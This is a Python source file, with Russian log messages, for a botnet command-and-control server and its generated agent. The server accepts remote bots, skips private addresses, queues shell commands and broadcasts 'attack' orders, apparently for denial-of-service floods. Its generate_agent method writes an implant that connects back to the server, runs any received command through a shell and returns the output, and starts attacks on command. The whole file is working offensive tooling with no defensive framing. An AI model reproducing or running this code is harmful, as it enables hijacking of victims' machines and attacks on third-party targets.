import asyncio, json, os, time, subprocess, psutil
from collections import defaultdict

BOTS_FILE = "bots.json"

class C2Server:
    def __init__(self, log_func=None, port=4444, bot_callback=None):
        self.log = log_func or print
        self.port = port
        self.bot_callback = bot_callback
        self.running = False
        self.bots = {}
        self.commands = defaultdict(list)
        self._server = None
        self._last_error = None

    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        ip = addr[0]
        if ip.startswith(('192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.', '127.', '0.')):
            self.log(f"[C2] Игнорирую локальное подключение: {ip}\n")
            writer.close()
            return
        self.log(f"[C2] Новое подключение: {ip}\n")
        self.bots[ip] = {"ip": ip, "port": addr[1], "status": "online", "last_seen": time.time()}
        self._save_bots()
        if self.bot_callback:
            self.bot_callback(ip, self.bots[ip])
        try:
            while self.running:
                if self.commands[ip]:
                    cmd = self.commands[ip].pop(0)
                else:
                    cmd = 'ping'
                writer.write(cmd.encode() + b'\n')
                await writer.drain()
                try:
                    data = await asyncio.wait_for(reader.readline(), timeout=30)
                except asyncio.TimeoutError:
                    self.log(f"[C2] Таймаут от {ip}, повтор\n")
                    continue
                if not data:
                    break
                self.bots[ip]["last_seen"] = time.time()
                self._save_bots()
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            self.log(f"[C2] Ошибка с {ip}: {e}\n")
        finally:
            if ip in self.bots:
                self.bots[ip]["status"] = "offline"
                self._save_bots()
                if self.bot_callback:
                    self.bot_callback(ip, self.bots[ip])
            writer.close()
            await writer.wait_closed()
            self.log(f"[C2] Отключён: {ip}\n")

    async def start_async(self):
        try:
            self._server = await asyncio.start_server(self.handle_client, '0.0.0.0', self.port)
        except OSError as e:
            self._last_error = str(e)
            self.log(f"[C2] Ошибка запуска сервера: {e}\n")
            return
        self.running = True
        self.log(f"[C2] Сервер запущен на порту {self.port}\n")
        async with self._server:
            await self._server.serve_forever()

    def start(self):
        if self._is_port_in_use(self.port):
            self._kill_process_on_port(self.port)
            time.sleep(0.5)
        self._last_error = None
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.start_async())
        except Exception as e:
            self._last_error = str(e)
        finally:
            loop.close()

    def _is_port_in_use(self, port):
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0

    def _kill_process_on_port(self, port):
        try:
            for proc in psutil.process_iter(['pid', 'name', 'connections']):
                for conn in proc.info['connections'] or []:
                    if conn.laddr.port == port:
                        self.log(f"[C2] Убиваю процесс {proc.pid} на порту {port}\n")
                        proc.kill()
                        proc.wait()
                        return
        except:
            pass

    def stop(self):
        self.running = False
        if self._server:
            self._server.close()
        self.log("[C2] Сервер остановлен\n")

    def get_last_error(self):
        return self._last_error

    def send_command(self, ip, cmd):
        if ip == 'all':
            for ip in self.bots:
                self.commands[ip].append(cmd)
        else:
            self.commands[ip].append(cmd)

    def launch_attack(self, target, method, threads, bots_ips):
        cmd = f"attack {target} {method} {threads}"
        if bots_ips == 'all':
            for ip in self.bots:
                self.commands[ip].append(cmd)
        else:
            for ip in bots_ips:
                if ip in self.bots:
                    self.commands[ip].append(cmd)

    def stop_attack(self, bots_ips):
        cmd = "stop"
        if bots_ips == 'all':
            for ip in self.bots:
                self.commands[ip].append(cmd)
        else:
            for ip in bots_ips:
                if ip in self.bots:
                    self.commands[ip].append(cmd)

    def get_bots(self):
        return self.bots

    def _save_bots(self):
        with open(BOTS_FILE, 'w') as f:
            json.dump(self.bots, f, indent=2)

    def load_bots(self):
        if os.path.exists(BOTS_FILE):
            try:
                with open(BOTS_FILE) as f:
                    self.bots = json.load(f)
            except:
                self.bots = {}

    def generate_agent(self, server_ip=None):
        if not server_ip:
            import socket
            server_ip = socket.gethostbyname(socket.gethostname())
        code = f'''import socket, subprocess, time
HOST = "{server_ip}"
PORT = {self.port}
while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        while True:
            cmd = s.recv(4096).decode().strip()
            if not cmd:
                break
            if cmd.startswith('attack '):
                _, target, method, threads = cmd.split()
                subprocess.Popen(['python3', '-c', f'from engine.attack import AsyncAttackEngine; e=AsyncAttackEngine([], 80); e.launch("{target}", "{method}", {threads})'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif cmd == 'stop':
                subprocess.run(['pkill', '-f', 'AsyncAttackEngine'])
            elif cmd == 'ping':
                s.send(b'pong\\n')
            else:
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                s.send((out.stdout + out.stderr).encode())
        s.close()
    except:
        time.sleep(30)
'''
        with open("agent.py", "w") as f:
            f.write(code)
        self.log(f"[+] Агент сохранён в agent.py (подключается к {server_ip}:{self.port})\n")
